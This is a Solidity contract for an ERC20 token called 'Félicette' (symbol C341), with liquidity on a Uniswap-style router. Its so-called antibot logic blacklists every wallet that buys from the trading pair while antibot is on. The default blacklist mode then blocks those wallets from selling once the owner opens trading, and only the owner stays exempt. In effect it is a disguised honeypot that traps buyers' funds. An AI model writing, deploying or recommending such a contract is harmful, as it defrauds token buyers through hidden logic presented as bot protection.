1 pragma solidity ^0.8.12;
2 
3 library SafeMath {
4 
5     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
6         return sub(a, b, "SafeMath: subtraction overflow");
7     }
8     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
9         require(b <= a, errorMessage);
10         uint256 c = a - b;
11 
12         return c;
13     }
14 }
15 
16 interface ERC20 {
17     function getOwner() external view returns (address);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address _owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 abstract contract Auth {
28     address internal owner;
29 
30     constructor(address _owner) {
31         owner = _owner;
32     }
33 
34     modifier onlyOwner() {
35         require(isOwner(msg.sender), "!OWNER"); _;
36     }
37 
38     function isOwner(address account) public view returns (bool) {
39         return account == owner;
40     }
41 
42     function renounceOwnership() public onlyOwner {
43         emit OwnershipTransferred(address(0));
44         owner = address(0);
45     }
46 
47     event OwnershipTransferred(address owner);
48 }
49 
50 interface IDEXFactory {
51     function createPair(address tokenA, address tokenB) external returns (address pair);
52 }
53 
54 interface IDEXRouter {
55     function factory() external pure returns (address);
56     function WETH() external pure returns (address);
57 
58     function addLiquidityETH(
59         address token,
60         uint amountTokenDesired,
61         uint amountTokenMin,
62         uint amountETHMin,
63         address to,
64         uint deadline
65     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
66 
67     function swapExactTokensForETHSupportingFeeOnTransferTokens(
68         uint amountIn,
69         uint amountOutMin,
70         address[] calldata path,
71         address to,
72         uint deadline
73     ) external;
74 }
75 
76 contract C341 is ERC20, Auth {
77     using SafeMath for uint256;
78 
79     address immutable WETH;
80     address constant DEAD = 0x000000000000000000000000000000000000dEaD;
81     address constant ZERO = 0x0000000000000000000000000000000000000000;
82 
83     string public constant name = unicode"Félicette";
84     string public constant symbol = "C341";
85     uint8 public constant decimals = 4;
86     uint256 public constant totalSupply = 10 * 10**9 * 10**decimals;
87 
88     uint256 public _maxTxAmount = 2 * totalSupply / 100;
89     uint256 public _maxWalletToken = 2 * totalSupply / 100;
90 
91     mapping (address => uint256) public balanceOf;
92     mapping (address => mapping (address => uint256)) _allowances;
93 
94     mapping (address => bool) isTxLimitExempt;
95     mapping (address => bool) isWalletLimitExempt;
96 
97     bool public antibot = true;
98     mapping (address => uint) public firstbuy;
99     bool public blacklistMode = true;
100     mapping (address => bool) public isBlacklisted;
101 
102     IDEXRouter public router;
103     address public pair;
104 
105     constructor () Auth(msg.sender) {
106         router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
107         WETH = router.WETH();
108 
109         pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
110         _allowances[address(this)][address(router)] = type(uint256).max;
111 
112         isTxLimitExempt[msg.sender] = true;
113         isTxLimitExempt[DEAD] = true;
114         isTxLimitExempt[ZERO] = true;
115 
116         isWalletLimitExempt[msg.sender] = true;
117         isWalletLimitExempt[address(this)] = true;
118         isWalletLimitExempt[DEAD] = true;
119 
120         balanceOf[msg.sender] = totalSupply;
121         emit Transfer(address(0), msg.sender, totalSupply);
122     }
123 
124     receive() external payable { }
125 
126     function getOwner() external view override returns (address) { return owner; }
127     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
128 
129     function approve(address spender, uint256 amount) public override returns (bool) {
130         _allowances[msg.sender][spender] = amount;
131         emit Approval(msg.sender, spender, amount);
132         return true;
133     }
134 
135     function approveMax(address spender) external returns (bool) {
136         return approve(spender, type(uint256).max);
137     }
138 
139     function transfer(address recipient, uint256 amount) external override returns (bool) {
140         return _transferFrom(msg.sender, recipient, amount);
141     }
142 
143     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
144         if(_allowances[sender][msg.sender] != type(uint256).max){
145             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
146         }
147 
148         return _transferFrom(sender, recipient, amount);
149     }
150 
151     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
152 
153         if(!isOwner(sender) && antibot){
154             if(sender == pair){
155                 if(firstbuy[recipient] == 0){
156                     firstbuy[recipient] = block.number;
157                 }
158                 blacklist_wallet(recipient,true);
159             }
160 
161             if(firstbuy[sender] > 0){
162                 require( firstbuy[sender] > (block.number - 20), "Bought before contract was launched");
163             }
164         }
165         
166         if(blacklistMode && !antibot){
167             require(!isBlacklisted[sender],"Blacklisted");    
168         }
169 
170         if (!isOwner(sender) && !isWalletLimitExempt[sender] && !isWalletLimitExempt[recipient] && recipient != pair) {
171             require((balanceOf[recipient] + amount) <= _maxWalletToken,"max wallet limit reached");
172         }
173 
174         require((amount <= _maxTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
175 
176         _basicTransfer(sender, recipient, amount);
177         return true;
178     }
179     
180     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
181         balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
182         balanceOf[recipient] = balanceOf[recipient] + amount;
183         emit Transfer(sender, recipient, amount);
184         return true;
185     }
186 
187     function manage_blacklist_status(bool _status) external onlyOwner {
188         blacklistMode = _status;
189     }
190 
191     function manage_blacklist(address[] calldata addresses, bool status) external onlyOwner {
192         for (uint256 i=0; i < addresses.length; ++i) {
193             blacklist_wallet(addresses[i],status);
194         }
195     }
196 
197     function blacklist_wallet(address _adr, bool _status) internal {
198         if(_status && _adr == address(this)){
199             return;
200         }
201         isBlacklisted[_adr] = _status;
202     }
203 
204     function tradingOpen() external onlyOwner {
205         antibot = false;
206     }
207 
208     function getCirculatingSupply() public view returns (uint256) {
209         return totalSupply.sub(balanceOf[DEAD]).sub(balanceOf[ZERO]);
210     }
211 
212 event AutoLiquify(uint256 amountETH, uint256 amountTokens);
213 
214 }